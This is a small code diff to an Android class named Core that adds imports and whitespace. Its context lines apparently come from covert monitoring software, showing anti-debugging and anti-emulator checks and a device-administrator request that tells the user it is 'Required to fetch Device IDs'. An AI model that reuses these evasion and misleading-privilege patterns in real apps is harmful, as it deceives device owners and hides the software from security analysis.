@@ -8,6 +8,7 @@
 package com.android.deviceinfo;
 
 import java.io.IOException;
+import java.util.List;
 
 import android.app.Activity;
 import android.app.ActivityManager;
@@ -47,6 +48,7 @@ import com.android.deviceinfo.util.AntiDebug;
 import com.android.deviceinfo.util.AntiEmulator;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.Utils;
+import com.android.deviceinfo.Reflect;
 
 /**
  * The Class Core, represents
@@ -231,7 +233,7 @@ public class Core extends Activity implements Runnable {
 
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
-			}
+			}			
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
 
 			// startActivityForResult(intent, ACTIVATION_REQUEST);
@@ -247,7 +249,6 @@ public class Core extends Activity implements Runnable {
 			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
 
 			context.startActivity(intent);
-
 		}
 
 		try {
@@ -857,3 +858,4 @@ public class Core extends Activity implements Runnable {
 	}
 
 }
+
